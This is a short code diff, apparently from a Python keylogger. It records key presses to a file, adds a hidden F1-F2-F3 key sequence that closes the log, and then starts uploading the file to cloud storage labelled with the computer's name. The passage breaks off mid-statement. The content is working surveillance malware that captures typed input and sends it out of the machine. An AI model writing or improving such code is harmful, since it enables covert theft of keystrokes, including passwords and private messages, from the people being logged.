@@ -23,14 +23,19 @@ today_date = full_currentTime.split(' ')[1]
 f = open('data.txt', 'w', encoding='utf-8')
 
 data = ''
-lastThreeKeys=[]
+lastThreeKeys = []
 countDelete = 0
 clicks_counter = 0
 
 
 def on_press(key):
+    global lastThreeKeys
+    if len(lastThreeKeys) == 3:
+        lastThreeKeys = lastThreeKeys[1:]
+    lastThreeKeys.append(str(key))
+
     try:
-        if hasattr(key, 'char') and key.char == '0':
+        if lastThreeKeys==['Key.f1','Key.f2','Key.f3']:
             f.close()
 
             storage.child(os.environ['COMPUTERNAME'] +
